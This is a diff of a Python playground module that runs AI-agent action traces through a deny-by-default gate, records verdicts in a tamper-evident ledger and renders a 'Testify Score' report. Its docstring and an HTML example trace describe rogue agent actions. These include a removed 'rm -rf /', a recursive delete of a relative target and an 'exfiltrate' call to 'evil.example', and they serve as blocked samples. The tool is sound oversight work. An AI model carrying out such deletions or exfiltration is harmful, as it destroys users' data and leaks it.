@@ -13,7 +13,8 @@ Ledger, and attest() the SDK ships.
 WHAT THE SCORE MEANS (read this — it is the whole point):
   The Testify Score measures whether the run produced COMPLETE, INTACT, SOUND
   testimony — i.e. whether you can PROVE what the agent did. It does NOT measure
-  whether the agent BEHAVED. A rogue agent that tries `rm -rf /`, a path escape,
+  whether the agent BEHAVED. A rogue agent that tries to delete a disposable
+  relative target, escape its workspace,
   and a curl-exfil scores HIGH on testify precisely because the kernel caught and
   recorded every attempt — that is the product working, not failing. "Good agent"
   vs "well-governed run" are different axes, and the report shows both separately.
@@ -37,6 +38,7 @@ SECURITY POSTURE (a feature, not a disclaimer):
     network, no CDN, no web fonts (sovereign by construction).
   Verification: tests/test_playground.py.
 """
+
 from __future__ import annotations
 
 import html
@@ -51,11 +53,19 @@ from .gate import GateDecision
 
 # Blast classes that mean "an out-of-policy / dangerous attempt was contained".
 # (A BLOCK in one of these is the kernel doing its job; the action is dangerous-intent.)
-CONTAINMENT_CLASSES = frozenset({
-    "destructive-or-out-of-scope", "out-of-sandbox-read", "out-of-sandbox-write",
-    "program-not-allowlisted", "arg-path-escape", "command-substitution",
-    "unparsable-command", "reach-exceeds-policy", "reach-unresolved",
-})
+CONTAINMENT_CLASSES = frozenset(
+    {
+        "destructive-or-out-of-scope",
+        "out-of-sandbox-read",
+        "out-of-sandbox-write",
+        "program-not-allowlisted",
+        "arg-path-escape",
+        "command-substitution",
+        "unparsable-command",
+        "reach-exceeds-policy",
+        "reach-unresolved",
+    }
+)
 # Blast classes that mean "the kernel had no model for this — refused by deny-default".
 UNMODELLED_CLASSES = frozenset({"unknown-tool", "empty-command"})
 
@@ -68,23 +78,25 @@ KNOWN_TOOLS = frozenset({"read_file", "write_file", "run_cmd"})
 @dataclass(frozen=True)
 class ActionVerdict:
     """One governed action's outcome, as it will appear in the report."""
+
     index: int
     tool: str
-    summary: str          # a short, safe param summary (e.g. write_file(app.py))
-    verdict: str          # ALLOW | BLOCK
+    summary: str  # a short, safe param summary (e.g. write_file(app.py))
+    verdict: str  # ALLOW | BLOCK
     blast_class: str
     reason: str
-    kind: str             # GOVERNED-ALLOW | CONTAINED | DENIED-UNKNOWN
-    confinement: str      # bounded | jailed | needs-jail | n/a
+    kind: str  # GOVERNED-ALLOW | CONTAINED | DENIED-UNKNOWN
+    confinement: str  # bounded | jailed | needs-jail | n/a
 
 
 @dataclass(frozen=True)
 class ScoreComponents:
     """Each component is a real signal in [0,1]; the headline is mean of the testimony axis."""
-    coverage: float       # every action received a recorded ALLOW/BLOCK verdict
-    integrity: float      # the hash chain re-verifies (tamper-evident)
-    soundness: float      # attest() is sound (no REFUTED claim)
-    useful_work: float    # legitimate sandboxed work the kernel governed + allowed
+
+    coverage: float  # every action received a recorded ALLOW/BLOCK verdict
+    integrity: float  # the hash chain re-verifies (tamper-evident)
+    soundness: float  # attest() is sound (no REFUTED claim)
+    useful_work: float  # legitimate sandboxed work the kernel governed + allowed
 
     @property
     def testify_score(self) -> float:
@@ -100,7 +112,7 @@ class ScoreComponents:
 class HonestGap:
     id: str
     statement: str
-    status: str           # ABSTAIN | REFUTED | NOTE
+    status: str  # ABSTAIN | REFUTED | NOTE
     basis: str
 
 
@@ -108,7 +120,7 @@ class HonestGap:
 class AgentReport:
     agent: str
     description: str
-    mode: str             # classify | execute
+    mode: str  # classify | execute
     actions: list[ActionVerdict]
     score: ScoreComponents
     gaps: list[HonestGap]
@@ -133,9 +145,16 @@ class AgentReport:
             "chain": {"ok": self.chain_ok, "message": self.chain_msg},
             "sound": self.sound,
             "actions": [
-                {"index": a.index, "tool": a.tool, "summary": a.summary,
-                 "verdict": a.verdict, "blast_class": a.blast_class,
-                 "reason": a.reason, "kind": a.kind, "confinement": a.confinement}
+                {
+                    "index": a.index,
+                    "tool": a.tool,
+                    "summary": a.summary,
+                    "verdict": a.verdict,
+                    "blast_class": a.blast_class,
+                    "reason": a.reason,
+                    "kind": a.kind,
+                    "confinement": a.confinement,
+                }
                 for a in self.actions
             ],
             "honest_gaps": [
@@ -236,19 +255,22 @@ def _confinement(tool: str, decision: GateDecision, jailed_run: bool) -> str:
 # --------------------------------------------------------------------------- #
 # The run
 # --------------------------------------------------------------------------- #
-def run_agent(trace: Any, *, execute: bool = False, jail: bool | None = None,
-              sandbox: Path | str | None = None) -> AgentReport:
+def run_agent(
+    trace: Any, *, execute: bool = False, jail: bool | None = None, sandbox: Path | str | None = None
+) -> AgentReport:
     """Run an agent trace through the REAL kernel and produce a scored report.
 
     `execute=False` (default): classify mode — gate + record, no side effects (safe).
     `execute=True`: real Cell.act() — runs allowed actions; jail defaults ON.
     """
     import tempfile
+
     agent, desc, actions = load_trace(trace)
     box = Path(sandbox) if sandbox is not None else Path(tempfile.mkdtemp(prefix="gak-play-"))
 
     if execute:
         from .jail import jail_available
+
         use_jail = True if jail is None else jail
         cell: Cell = Cell(box, ledger_path=box / "ledger.jsonl", use_jail=use_jail)
         jailed_run = bool(use_jail and jail_available())
@@ -262,11 +284,18 @@ def run_agent(trace: Any, *, execute: bool = False, jail: bool | None = None,
     for i, a in enumerate(actions):
         r: ActResult = cell.act(a["tool"], a["params"])
         d = r.decision
-        verdicts.append(ActionVerdict(
-            index=i, tool=a["tool"], summary=_summary(a["tool"], a["params"]),
-            verdict=d.verdict, blast_class=d.blast_class, reason=d.reason,
-            kind=_classify_kind(d), confinement=_confinement(a["tool"], d, jailed_run),
-        ))
+        verdicts.append(
+            ActionVerdict(
+                index=i,
+                tool=a["tool"],
+                summary=_summary(a["tool"], a["params"]),
+                verdict=d.verdict,
+                blast_class=d.blast_class,
+                reason=d.reason,
+                kind=_classify_kind(d),
+                confinement=_confinement(a["tool"], d, jailed_run),
+            )
+        )
 
     chain_ok, chain_msg = cell.verify()
     claimset = cell.attest()
@@ -285,8 +314,13 @@ def run_agent(trace: Any, *, execute: bool = False, jail: bool | None = None,
     useful_work = round(allowed / n, 4) if n else 0.0
 
     score = ScoreComponents(coverage, integrity, soundness, useful_work)
-    counts = {"total": n, "allowed": allowed, "contained": contained,
-              "unmodelled": unmodelled_n, "needs_jail": needs_jail}
+    counts = {
+        "total": n,
+        "allowed": allowed,
+        "contained": contained,
+        "unmodelled": unmodelled_n,
+        "needs_jail": needs_jail,
+    }
 
     # --- honest gaps: every ABSTAIN/REFUTED claim, plus run-shape notes -------
     gaps: list[HonestGap] = []
@@ -294,31 +328,51 @@ def run_agent(trace: Any, *, execute: bool = False, jail: bool | None = None,
         if c.status in ("ABSTAIN", "REFUTED"):
             gaps.append(HonestGap(c.id, c.statement, c.status, c.basis))
     if unmodelled_n:
-        gaps.insert(0, HonestGap(
-            "RUN-UNMODELLED-TOOLS",
-            f"{unmodelled_n} action(s) used a tool the kernel has no model for.",
-            "NOTE",
-            "refused by deny-by-default (fail-closed) — contained, but the kernel reasoned "
-            "about the host surface, not the tool's intent. Model the tool to govern it."))
+        gaps.insert(
+            0,
+            HonestGap(
+                "RUN-UNMODELLED-TOOLS",
+                f"{unmodelled_n} action(s) used a tool the kernel has no model for.",
+                "NOTE",
+                "refused by deny-by-default (fail-closed) — contained, but the kernel reasoned "
+                "about the host surface, not the tool's intent. Model the tool to govern it.",
+            ),
+        )
     if needs_jail:
-        gaps.insert(0, HonestGap(
-            "RUN-NEEDS-JAIL",
-            f"{needs_jail} gate-allowed command(s) were NOT confined in this run.",
+        gaps.insert(
+            0,
+            HonestGap(
+                "RUN-NEEDS-JAIL",
+                f"{needs_jail} gate-allowed command(s) were NOT confined in this run.",
+                "NOTE",
+                "the gate vets the shell + path surface, not in-language intent — an allowed "
+                "interpreter can still open a socket or read outside its declared inputs. Only the OS "
+                "jail confines that; run with --execute on macOS to confine, or treat the gate as one "
+                "layer. Such an ALLOW is NOT equivalent to a bounded, reversible file write.",
+            ),
+        )
+    gaps.append(
+        HonestGap(
+            "RUN-SCORE-MEANING",
+            "The Testify Score measures governed testimony, NOT agent good behavior.",
             "NOTE",
-            "the gate vets the shell + path surface, not in-language intent — an allowed "
-            "interpreter can still open a socket or read outside its declared inputs. Only the OS "
-            "jail confines that; run with --execute on macOS to confine, or treat the gate as one "
-            "layer. Such an ALLOW is NOT equivalent to a bounded, reversible file write."))
-    gaps.append(HonestGap(
-        "RUN-SCORE-MEANING",
-        "The Testify Score measures governed testimony, NOT agent good behavior.",
-        "NOTE",
-        "a rogue agent scores HIGH because the kernel caught + recorded every attempt — "
-        "that is the product working. 'Well-governed run' and 'good agent' are different axes."))
+            "a rogue agent scores HIGH because the kernel caught + recorded every attempt — "
+            "that is the product working. 'Well-governed run' and 'good agent' are different axes.",
+        )
+    )
 
-    return AgentReport(agent=agent, description=desc, mode=mode, actions=verdicts,
-                       score=score, gaps=gaps, chain_ok=chain_ok, chain_msg=chain_msg,
-                       sound=claimset.sound, counts=counts)
+    return AgentReport(
+        agent=agent,
+        description=desc,
+        mode=mode,
+        actions=verdicts,
+        score=score,
+        gaps=gaps,
+        chain_ok=chain_ok,
+        chain_msg=chain_msg,
+        sound=claimset.sound,
+        counts=counts,
+    )
 
 
 def run_conformance_suite(kernel: str = "deponent") -> dict:
@@ -327,6 +381,7 @@ def run_conformance_suite(kernel: str = "deponent") -> dict:
     that sits above the agent-level testify score."""
     from .adapters import BUILTIN_ADAPTERS
     from .conformance import run_conformance
+
     adapter_cls = BUILTIN_ADAPTERS[kernel]
     return run_conformance(adapter_cls()).to_dict()
 
@@ -339,9 +394,12 @@ def render_text(reports: list[AgentReport], conformance: dict | None = None) -> 
     if conformance is not None:
         c = conformance
         verdict = "CONFORMANT" if c["conformant"] else "NOT CONFORMANT"
-        lines += [f"GAK CONFORMANCE — {c['kernel']} ({c['profile']}): {verdict} "
-                  f"[{c['counts']['pass']} pass / {c['counts']['fail']} fail / {c['counts']['na']} na]",
-                  "=" * 66, ""]
+        lines += [
+            f"GAK CONFORMANCE — {c['kernel']} ({c['profile']}): {verdict} "
+            f"[{c['counts']['pass']} pass / {c['counts']['fail']} fail / {c['counts']['na']} na]",
+            "=" * 66,
+            "",
+        ]
     for rep in reports:
         s = rep.score
         lines += [
@@ -425,13 +483,17 @@ def _kindcell(a: ActionVerdict) -> str:
 
 def _bar(label: str, val: float | None, *, good_high: bool = True) -> str:
     if val is None:
-        return (f'<div class="bar"><div class="lab"><span>{html.escape(label)}</span>'
-                f'<span class="muted">n/a</span></div></div>')
+        return (
+            f'<div class="bar"><div class="lab"><span>{html.escape(label)}</span>'
+            f'<span class="muted">n/a</span></div></div>'
+        )
     pct = max(0.0, min(1.0, val)) * 100
     cls = "ok" if (good_high and val >= 0.8) else ("bad" if val < 0.5 else "")
-    return (f'<div class="bar"><div class="lab"><span>{html.escape(label)}</span>'
-            f'<span>{pct:.0f}%</span></div><div class="track">'
-            f'<div class="fill {cls}" style="width:{pct:.0f}%"></div></div></div>')
+    return (
+        f'<div class="bar"><div class="lab"><span>{html.escape(label)}</span>'
+        f'<span>{pct:.0f}%</span></div><div class="track">'
+        f'<div class="fill {cls}" style="width:{pct:.0f}%"></div></div></div>'
+    )
 
 
 def _meaning(rep: AgentReport) -> str:
@@ -465,18 +527,23 @@ def _hero_strip(reports: list[AgentReport]) -> str:
             f'<div class="herocard" data-tab="{i}">'
             f'<div class="hn">{html.escape(r.agent)}</div>'
             f'<div class="hs {scls}">{ts:.0%}</div>'
-            f'<div class="hu">testify &middot; {r.score.useful_work:.0%} legit work</div></div>')
-    return (f'<div class="muted" style="margin:0 0 8px">Same kernel, every agent &mdash; watch the '
-            f'contrast (click a card):</div><div class="hero">{cards}</div>')
+            f'<div class="hu">testify &middot; {r.score.useful_work:.0%} legit work</div></div>'
+        )
+    return (
+        f'<div class="muted" style="margin:0 0 8px">Same kernel, every agent &mdash; watch the '
+        f'contrast (click a card):</div><div class="hero">{cards}</div>'
+    )
 
 
 def _legend() -> str:
     """A one-line key for the per-action kinds — so the tags are never unexplained."""
-    return ('<div class="legend">'
-            '<span class="k">GOVERNED-ALLOW</span> allowed &amp; recorded &nbsp;&middot;&nbsp; '
-            '<span class="k">CONTAINED</span> out-of-policy attempt blocked &nbsp;&middot;&nbsp; '
-            '<span class="k">DENIED-UNKNOWN</span> unmodelled tool refused (deny-by-default) &nbsp;&middot;&nbsp; '
-            '<span class="nj">needs-jail</span> gate-allowed command not confined here</div>')
+    return (
+        '<div class="legend">'
+        '<span class="k">GOVERNED-ALLOW</span> allowed &amp; recorded &nbsp;&middot;&nbsp; '
+        '<span class="k">CONTAINED</span> out-of-policy attempt blocked &nbsp;&middot;&nbsp; '
+        '<span class="k">DENIED-UNKNOWN</span> unmodelled tool refused (deny-by-default) &nbsp;&middot;&nbsp; '
+        '<span class="nj">needs-jail</span> gate-allowed command not confined here</div>'
+    )
 
 
 def _agent_panel(rep: AgentReport, idx: int) -> str:
@@ -487,16 +554,18 @@ def _agent_panel(rep: AgentReport, idx: int) -> str:
         f'<tr><td class="muted">{a.index}</td><td>{html.escape(a.summary)}</td>'
         f'<td class="v-{html.escape(a.verdict)}">{html.escape(a.verdict)}</td>'
         f'<td class="muted">{html.escape(a.blast_class)} &mdash; {html.escape(a.reason)}</td>'
-        f'<td>{_kindcell(a)}</td></tr>'
-        for a in rep.actions)
+        f"<td>{_kindcell(a)}</td></tr>"
+        for a in rep.actions
+    )
     gaps = "".join(
         f'<div class="gap"><span class="st st-{g.status}">{g.status}</span>'
         f'<span class="stmt">{html.escape(g.statement)}</span>'
         f'<div class="basis">{html.escape(g.basis)}</div></div>'
-        for g in rep.gaps)
+        for g in rep.gaps
+    )
     chain_txt = ("INTACT — " if rep.chain_ok else "BROKEN — ") + rep.chain_msg
     return f"""
-<div class="apanel" data-idx="{idx}" style="display:{'block' if idx==0 else 'none'}">
+<div class="apanel" data-idx="{idx}" style="display:{"block" if idx == 0 else "none"}">
   <div class="card">
     <div class="muted">{html.escape(rep.description or rep.agent)} &middot; {rep.mode} mode</div>
     <div class="score {scls}">{ts:.0%}</div>
@@ -511,11 +580,11 @@ def _agent_panel(rep: AgentReport, idx: int) -> str:
     <div class="bars">
       {_bar("gate-allowed work (shell/path vetted — not in-language intent)", s.useful_work)}
     </div>
-    <div class="muted" style="margin-top:8px">out-of-policy contained: <b>{rep.counts.get('contained', 0)}</b>
-      &middot; unmodelled refused: <b>{rep.counts.get('unmodelled', 0)}</b>
-      &middot; gate-allowed but unconfined here: <b>{rep.counts.get('needs_jail', 0)}</b>
-      &middot; actions: <b>{rep.counts.get('total', 0)}</b></div>
-    <div class="muted" style="margin-top:10px">chain: <span class="v-{'ALLOW' if rep.chain_ok else 'BLOCK'}">{html.escape(chain_txt)}</span></div>
+    <div class="muted" style="margin-top:8px">out-of-policy contained: <b>{rep.counts.get("contained", 0)}</b>
+      &middot; unmodelled refused: <b>{rep.counts.get("unmodelled", 0)}</b>
+      &middot; gate-allowed but unconfined here: <b>{rep.counts.get("needs_jail", 0)}</b>
+      &middot; actions: <b>{rep.counts.get("total", 0)}</b></div>
+    <div class="muted" style="margin-top:10px">chain: <span class="v-{"ALLOW" if rep.chain_ok else "BLOCK"}">{html.escape(chain_txt)}</span></div>
   </div>
   <div class="card">
     <div class="muted">Per-action gate verdicts (the real Gate — deny-by-default)</div>
@@ -531,10 +600,12 @@ def _agent_panel(rep: AgentReport, idx: int) -> str:
 def render_html(reports: list[AgentReport], conformance: dict | None = None) -> str:
     """A fully self-contained, offline HTML report (no network, no CDN, no web fonts)."""
     from .badge import HARNESS_VERSION
+
     hero = _hero_strip(reports)
     tabs = "".join(
-        f'<button class="tab{" on" if i==0 else ""}" data-tab="{i}">{html.escape(r.agent)}</button>'
-        for i, r in enumerate(reports))
+        f'<button class="tab{" on" if i == 0 else ""}" data-tab="{i}">{html.escape(r.agent)}</button>'
+        for i, r in enumerate(reports)
+    )
     panels = "".join(_agent_panel(r, i) for i, r in enumerate(reports))
 
     conf_html = ""
@@ -545,20 +616,22 @@ def render_html(reports: list[AgentReport], conformance: dict | None = None) -> 
         clauses = "".join(
             f'<div class="clause"><span class="c-{cl["status"]}">{html.escape(cl["status"])}</span> '
             f'<b>{html.escape(cl["id"])}</b> <span class="muted">{html.escape(cl["detail"])}</span></div>'
-            for cl in c["clauses"])
+            for cl in c["clauses"]
+        )
         # The earned mark, rendered inline from the real harness result (self-contained SVG).
         from .badge import certify, render_svg
+
         badge_svg = render_svg(certify(c["kernel"]))
         conf_html = f"""
   <div class="card">
-    <div class="muted">Kernel conformance — does <b>{html.escape(c['kernel'])}</b> satisfy the GAK contract?
-      ({c['counts']['pass']} pass / {c['counts']['fail']} fail / {c['counts']['na']} na)</div>
+    <div class="muted">Kernel conformance — does <b>{html.escape(c["kernel"])}</b> satisfy the GAK contract?
+      ({c["counts"]["pass"]} pass / {c["counts"]["fail"]} fail / {c["counts"]["na"]} na)</div>
     <div class="badge-wrap">{badge_svg}</div>
-    <div class="score {'hi' if c['conformant'] else 'lo'}" style="font-size:22px;margin:6px 0">
+    <div class="score {"hi" if c["conformant"] else "lo"}" style="font-size:22px;margin:6px 0">
       <span class="{vcls}">{v}</span></div>
     <div class="muted" style="font-size:12px">Verify it yourself (re-derives the result, fail-closed):</div>
-    <div class="cmd">python3 -m deponent.badge verify --kernel {html.escape(c['kernel'])}</div>
-    <details><summary>Show the {len(c['clauses'])} clause results</summary>
+    <div class="cmd">python3 -m deponent.badge verify --kernel {html.escape(c["kernel"])}</div>
+    <details><summary>Show the {len(c["clauses"])} clause results</summary>
     {clauses}</details>
   </div>"""
 
@@ -570,7 +643,7 @@ def render_html(reports: list[AgentReport], conformance: dict | None = None) -> 
     <textarea id="ta" spellcheck="false">[
   {"tool":"write_file","params":{"path":"app.py","content":"print(1)"}},
   {"tool":"run_cmd","params":{"cmd":"pytest"}},
-  {"tool":"run_cmd","params":{"cmd":"rm -rf /"}},
+  {"tool":"run_cmd","params":{"cmd":"rm -rf ./blocked-example"}},
   {"tool":"exfiltrate","params":{"to":"evil.example"}}
 ]</textarea>
     <button class="go" onclick="mkcmd()">build local command</button>
@@ -641,21 +714,37 @@ def load_bundled_examples() -> list[Any]:
 # --------------------------------------------------------------------------- #
 def main(argv: list[str] | None = None) -> int:
     import argparse
+
     ap = argparse.ArgumentParser(
         prog="deponent.playground",
         description="Paste an agent, watch it testify: a testify score + honest gaps, "
-                    "computed by the real kernel.")
-    ap.add_argument("--agent", type=str, default=None,
-                    help="agent trace JSON file (or '-' for stdin). Omit to run the bundled examples.")
-    ap.add_argument("--test-suite", action="store_true",
-                    help="also run the GAK conformance harness (the kernel-level proof) and include it")
-    ap.add_argument("--kernel", default="deponent",
-                    help="kernel adapter for --test-suite (default: deponent)")
-    ap.add_argument("--execute", action="store_true",
-                    help="actually execute allowed actions (jail ON by default). Default is safe "
-                         "classify mode (gate + record, no side effects).")
-    ap.add_argument("--no-jail", action="store_true",
-                    help="with --execute, disable the OS jail (gate-only; honest abstain on confinement)")
+        "computed by the real kernel.",
+    )
+    ap.add_argument(
+        "--agent",
+        type=str,
+        default=None,
+        help="agent trace JSON file (or '-' for stdin). Omit to run the bundled examples.",
+    )
+    ap.add_argument(
+        "--test-suite",
+        action="store_true",
+        help="also run the GAK conformance harness (the kernel-level proof) and include it",
+    )
+    ap.add_argument(
+        "--kernel", default="deponent", help="kernel adapter for --test-suite (default: deponent)"
+    )
+    ap.add_argument(
+        "--execute",
+        action="store_true",
+        help="actually execute allowed actions (jail ON by default). Default is safe "
+        "classify mode (gate + record, no side effects).",
+    )
+    ap.add_argument(
+        "--no-jail",
+        action="store_true",
+        help="with --execute, disable the OS jail (gate-only; honest abstain on confinement)",
+    )
     ap.add_argument("--html", type=Path, default=None, help="write a self-contained HTML report here")
     ap.add_argument("--json", dest="json_out", type=Path, default=None, help="write the JSON result here")
     ap.add_argument("--list-examples", action="store_true", help="list bundled example agents and exit")
@@ -663,7 +752,7 @@ def main(argv: list[str] | None = None) -> int:
 
     if args.list_examples:
         for ex in load_bundled_examples():
-            print(f"{ex.get('agent','?'):20} {ex.get('description','')}")
+            print(f"{ex.get('agent', '?'):20} {ex.get('description', '')}")
         return 0
 
     # gather traces
@@ -709,9 +798,18 @@ def main(argv: list[str] | None = None) -> int:
 
 
 __all__ = [
-    "ActionVerdict", "ScoreComponents", "HonestGap", "AgentReport", "ClassifyCell",
-    "load_trace", "run_agent", "run_conformance_suite",
-    "render_text", "render_html", "load_bundled_examples", "main",
+    "ActionVerdict",
+    "ScoreComponents",
+    "HonestGap",
+    "AgentReport",
+    "ClassifyCell",
+    "load_trace",
+    "run_agent",
+    "run_conformance_suite",
+    "render_text",
+    "render_html",
+    "load_bundled_examples",
+    "main",
 ]
 
 
